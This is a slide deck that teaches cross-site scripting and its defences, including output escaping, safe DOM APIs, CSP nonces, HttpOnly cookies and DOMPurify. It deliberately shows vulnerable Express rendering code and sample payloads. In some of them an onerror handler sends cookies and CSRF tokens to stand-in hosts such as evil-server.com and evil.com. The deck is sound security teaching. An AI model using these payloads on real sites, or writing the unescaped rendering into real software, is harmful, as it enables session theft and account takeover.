---
background: '#0b0b0b'
colorSchema: dark
head: |
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-88BFTGK71E"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-88BFTGK71E');
  </script>
---

# Cross-Site Scripting

**The feature you didn't know you were shipping**

---

<style>
#slidev-goto-dialog {
  display: none !important;
}
.slidev-layout {
  font-family: 'DM Sans', system-ui, sans-serif;
  color: #f4f4f4;
}
.slidev-layout.title {
  text-align: center;
}
.slidev-layout.title h1 {
  font-size: 2.4em;
  color: #f38f5a;
  letter-spacing: -0.03em;
}
.slidev-layout.title p {
  color: #aaaaaa;
  font-size: 1.1em;
}
.slidev-layout h2 {
  color: #f4f4f4;
  font-weight: 200;
  font-size: 1.9em;
  letter-spacing: 0.01em;
  border-bottom: 2px solid #f38f5a;
  padding-bottom: 0.3em;
}
.slidev-layout a {
  color: #f38f5a;
}
.slidev-layout strong {
  color: #f38f5a;
}
.slidev-layout em {
  color: #f38f5a;
  font-style: normal;
}
.slidev-layout code {
  font-family: 'DM Mono', 'JetBrains Mono', monospace;
  background: rgba(255,255,255,0.08);
  color: #f4f4f4;
  border-radius: 4px;
  padding: 0.1em 0.3em;
  font-size: 1.4em;
}
.slidev-layout pre {
  background: #040b15;
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 8px;
}
.slidev-layout pre code {
  background: transparent;
  padding: 0;
  font-family: 'DM Mono', 'JetBrains Mono', monospace;
  color: #f4f4f4;
  font-weight: 300;
}
.slidev-layout table {
  border-collapse: collapse;
  width: 100%;
}
.slidev-layout th {
  color: #f38f5a;
  border-bottom: 1px solid rgba(255,255,255,0.14);
  font-weight: 600;
}
.slidev-layout td {
  color: #f4f4f4;
  border-bottom: 1px solid rgba(255,255,255,0.06);
}
.slidev-layout blockquote {
  border-left: 3px solid #f38f5a;
  color: #aaaaaa;
  background: rgba(243,143,90,0.06);
  padding: 0.5em 1em;
  border-radius: 0 4px 4px 0;
  font-size: 1.1em;
  margin-top: 15px;
}
.slidev-layout ul li, .slidev-layout ol li {
  color: #f4f4f4;
}
.slidev-layout ul li::marker, .slidev-layout ol li::marker {
  color: #f38f5a;
}
.slidev-layout p {
  color: #f4f4f4;
}
.slidev-layout pre span {
  color: var(--shiki-dark) !important;
}
.slidev-layout pre span[style*="#BD976A"],
.slidev-layout pre span[style*="#dbd7caee"],
.slidev-layout pre span[style*="#DBD7CAEE"] {
  --shiki-dark: #f4f4f4 !important;
}
.slidev-layout pre span[style*="#80A665"],
.slidev-layout pre span[style*="#4D9375"] {
  --shiki-dark: #ff9e4a !important;
}
.slidev-layout pre span[style*="#C98A7D"],
.slidev-layout pre span[style*="#FDAEB7"] {
  --shiki-dark: #82b1ff !important;
}
</style>

## It Started Innocently Enough

You have a profile page. Someone asks for a "bio" or "description" field. Simple textarea. Couple lines of code. Ship it.

```javascript
app.post('/profile', (req, res) => {
  db.users.update(req.session.userId, {
    description: req.body.description
  });
});
```

```javascript
app.get('/profile', (req, res) => {
  const user = db.users.findById(req.params.id);
  res.send(`
    <h1>${user.name}</h1>
    <p>${user.description}</p>
  `);
});
```

---

## A Few Weeks Later...

A user emails you: *"Hey, I noticed I can use `<b>` tags in my description and they show up bold. That's neat!"*

You check. They're right.

```
User types:  I <b>love</b> this site!
                    ↓
Renders as:  I **love** this site!    ← bold works!
```

You think: *Huh. That's actually kind of cool. Not a bug — a feature.*

> And... this is where a XSS story begins.

---

## You Get Curious

```html
<!-- Bold text — works! -->
I <b>love</b> this site!

<!-- A link — works too! -->
Check out my <a href="https://my.site">portfolio</a>

<!-- An image — oh, that works as well -->
Here's my photo: <img src="https://i.imgur.com/cat.jpg">

<!-- Some inline style — nice! -->
<p style="color: red;">Look at me</p>
```

>All of it renders. Every tag. Every attribute. No stripping. No encoding.
The server just takes your input and splats it into the HTML.

---

## The Experiment

You type something into your own description — just to see:

```html
<script>
  alert('Hello from my profile!');
</script>
```

You save. You reload.

An alert appears.

Then you realize: holy crap you can execute whatever you want.

> Uh oh. What else can you do?

---

## But You're a Developer

You know about event handlers.

```html
<img src="x.jpg" onerror="alert('you just ran my XSS script!')">
```

You save. You reload your profile.

The image fails to load (there's no `x.jpg`). The `onerror` fires. An alert pops up.

```
You just ran JavaScript from inside a description field.
It wasn't even hard.
```

> This was an attribute the browser treats as code. And the browser sees *all* attributes as valid markup from the trusted origin.

---

## Now You Realize

If *you* can do this, *anyone* can do this.

```html
<img src="x" onerror="
  fetch('https://evil-server.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      tokens: document.querySelectorAll('[name=_csrf]')[0]?.value
    })
  })
">
```

> And you never notice. There's no visual change. No broken layout. Just one pixel that didn't load and a request that disappeared into the network.

---

## This Is Cross-Site Scripting

**Cross-Site Scripting (XSS)** is exactly what you just did: injecting code into a trusted page that runs in every visitor's browser.

<img src="/assets/xss-flow.svg" width="800">

> It's called *cross-site* because the code comes from an *external source* (the attacker) but runs *inside* the trusted site's origin. The browser has no idea it wasn't written by you.

---

## Three Ways This Happens

You discovered **Stored XSS**: the payload lives in the database. The number of victims is the number of browsers that render that element.

There are two other flavors:

| Type | How it works | Where the payload lives |
|------|-------------|------------------------|
| **Stored** | Saved in DB, served to every visitor | *On your server* |
| **Reflected** | In the URL, reflected back immediately | *In the request itself* |
| **DOM-based** | Client-side JS reads attacker input and writes to DOM unsafely | *In the browser runtime* |

---

## Reflected XSS — The Phishing Variant

What if the payload never touches the database at all?

```javascript
// Search endpoint — echoes the query back
app.get('/search', (req, res) => {
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${req.query.q}</p>  <!-- 💥 -->
  `);
});
```

```html
<!-- Attacker crafts a link and sends it to your users. 
     Note: link is not URL-encoded for demonstration. -->
<a href="https://yoursite.com/search?q=<script>steal()</script>">
  Check out this amazing deal!
</a>
```

---

## DOM-Based XSS — The One You Won't See on the Server

What if the payload never hits your server at all?

```html
<!-- Your client-side code reads from the URL hash -->
<script>
  const tab = location.hash.substring(1);
  document.getElementById('content').innerHTML = tab;  // 💥
</script>
```

```
URL:  https://yoursite.com/profile#<img src=x onerror="stealCookies()">                          
```

> No malicious input was stored. No suspicious URL was logged. The attack lives entirely in the browser's URL bar. You have zero visibility into this.

---

## What Makes This Work?

Your description field wasn't the problem. The problem is how you rendered it.

```
Browser receives:  <p>Hey, check out my profile!</p>
                          + <img src="x" onerror="steal()">
                                         ↓
                    ┌────────────────────┴───────────────────┐
                    │                                        │
          Browser sees:                              Attacker sees:
          "This is HTML from                     "This is code I control
           domain I trust"                        running on a domain
                                                  everyone trusts"
```

The browser has **one rule** for same-origin content: *It's all trusted.* It doesn't know which parts were written by you and which parts were injected by a user.

> When you interpolate user input into HTML without escaping, you're giving that user a seat at the table — with full editor privileges.

---

## How Do You Fix It?

### 1. Use a Safe Library for Rendering

```javascript
// ❌ Unsafe — raw string interpolation
res.send(`<h1>${user.name}</h1><p>${user.description}</p>`);

// ✅ Safe — EJS auto-escapes with <%= %>
res.render('profile', { name: user.name, description: user.description });
```

```html
<!-- profile.ejs — <%= %> escapes automatically -->
<h1><%= name %></h1>
<p><%= description %></p>
```

> If you're concatenating user input into HTML with `+` or `` `${}` ``, let the template engine handle it.

---

## 2. Use a Safe UI Library

If you're building a client-side app, use a library that treats data as text, not HTML.

```javascript
// ❌ Unsafe — innerHTML parses strings as markup
document.getElementById('bio').innerHTML = user.description;

// ✅ Safe — React and Vue treat data as text by default
// React
function Profile({ user }) {
  return <p>{user.description}</p>;  // auto-escaped
}

```

> React's escape hatch is called `dangerouslySetInnerHTML` — on purpose. If you use it, you're opting out of safety.

---

## 3. Content Security Policy — Your Insurance Policy

Even if you make a mistake, CSP can save you. It tells the browser: *"Only scripts from these sources are allowed to run."*

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  next();
});
```

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

If an attacker manages to inject a `<script>` tag or an `onerror` handler despite your encoding, CSP blocks it.

```
Injected:  <img src="x" onerror="stealCookies()">
                                      ↓
Browser checks CSP: "Is 'unsafe-inline' allowed for script-src?"
                                      ↓
                  No → onerror is silently ignored 🚫
```

> CSP turns "accept all scripts" into "deny by default, allow explicitly." It's the closest thing to a silver bullet for XSS.

---

## But Wait — What About Inline Scripts Your App Needs?

If your own JavaScript uses inline event handlers or `<script>` tags, a strict CSP will block those too. The solution: **nonces**.

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'nonce-${res.locals.nonce}'; object-src 'none'`
  );
  next();
});
```

---

## But Wait — What About Inline Scripts Your App Needs? (2)

```html
<!-- Your scripts run because they have the nonce -->
<script nonce="<%= nonce %>">
  initApp();
</script>

<!-- Injected scripts are blocked — they don't have the nonce -->
<script>
  stealCookies();  // ✋ blocked by CSP
</script>
```

> Each page load gets a unique nonce. Attackers can't guess it. Injected scripts can't run. Your app works normally.

---

## 4. HttpOnly Cookies — Limit the Blast Radius

Even if XSS slips through, you can keep the session cookie out of reach. The **HttpOnly** flag tells the browser: *"This cookie is off-limits to JavaScript."*

```javascript
// ❌ Unsafe — cookie accessible via document.cookie
res.cookie('session', sessionId, { httpOnly: false });
// ✅ Safe — cookie invisible to JavaScript
res.cookie('session', sessionId, { httpOnly: true });
```

```
Without HttpOnly:
  <img src=x onerror="fetch('//evil.com/steal?c='+document.cookie)">
                                                      💥 cookie leaked
With HttpOnly:
  <img src=x onerror="fetch('//evil.com/steal?c='+document.cookie)">
                                                      🚫 document.cookie is empty
```

> HttpOnly doesn't stop XSS. But it stops the most common XSS goal: session theft. It's a one-line change that removes the attacker's biggest payout.

---

## Safe DOM APIs

For client-side code, never use APIs that interpret strings as HTML:

| Avoid these | Use these instead |
|-------------|-------------------|
| `element.innerHTML = str` | `element.textContent = str` |
| `element.outerHTML = str` | `element.innerText = str` |
| `document.write(str)` | `document.createTextNode(str)` |
| `jQuery.html(str)` | `jQuery.text(str)` |
| `elem.insertAdjacentHTML(...)` | `elem.insertAdjacentText(...)` |

---


## Safe DOM APIs (2)

```javascript
// ❌ Unsafe — interprets as HTML
const tab = location.hash.substring(1);
document.getElementById('content').innerHTML = tab;

// ✅ Safe — interprets as text
const tab = location.hash.substring(1);
document.getElementById('content').textContent = tab;
```

> When you *must* render user-controlled HTML, use DOMPurify: `element.innerHTML = DOMPurify.sanitize(userInput)`

---

## What About the Existing Data?

You've fixed the code. But the database already has malicious descriptions from the past few weeks.

Every stored payload is still live.

```
┌──────────────────────────────────────────────────┐
│                                                  │
│   You shipped the field:       ← 2 weeks ago     │
│   Attackers found it:          ← 1 week ago      │
│   Users got compromised:       ← every day since │
│   You fixed the code:          ← right now       │
│   Old payloads still execute:  ← still today     │
│                                                  │
└──────────────────────────────────────────────────┘
```

Fix: **Re-render all existing descriptions** through your sanitizer. Or simply re-encode them all. You can't leave the land mines in the ground.

---

## Defense Comparison


Now that you understand each layer, here's how they compare:

| Defense | Stops Stored | Stops Reflected | Stops DOM-based | Bypass Risk |
|---------|-------------|----------------|-----------------|-------------|
| **Output Encoding** | ✅ | ✅ | ⚠️ (server-side only) | Context confusion |
| **Input Validation** | ✅ | ✅ | ❌ | Allowlist gaps |
| **CSP (Strict)** | ✅ | ✅ | ✅ | JSONP / known-script CDNs |
| **Safe DOM APIs** | ❌ | ❌ | ✅ | Developer discipline |
| **DOMPurify** | ⚠️ | ⚠️ | ✅ | Library bugs (rare) |

> Input validation AND Output Encoding must be paired together, it is not sufficient to do only one.


---

## What You Learned

- **A harmless description field** became a remote code execution vector — because you forgot to encode the output
- **XSS** lets attackers run JavaScript on your domain with full access to the page
- **Stored XSS** is the most dangerous — one payload infects every visitor, no phishing required
- **Output encoding** is the fix: escape `<>&"'` before inserting user input into HTML
- **CSP** is your safety net: it blocks injected scripts even if encoding fails
- **Nonces** make CSP work with real apps that need inline scripts
- **You have to clean up existing data** — fixing the code doesn't remove old payloads from the database

> The feature you shipped without thinking about security is the one attackers will find first. They're not looking for bugs — they're looking for features that don't escape their input.

---

# Thanks

**OWASP XSS** — [owasp.org/www-community/attacks/xss](https://owasp.org/www-community/attacks/xss)

**CSP Reference** — [content-security-policy.com](https://content-security-policy.com)

**DOMPurify** — [github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)

**sanitize-html** — [github.com/apostrophecms/sanitize-html](https://github.com/apostrophecms/sanitize-html)

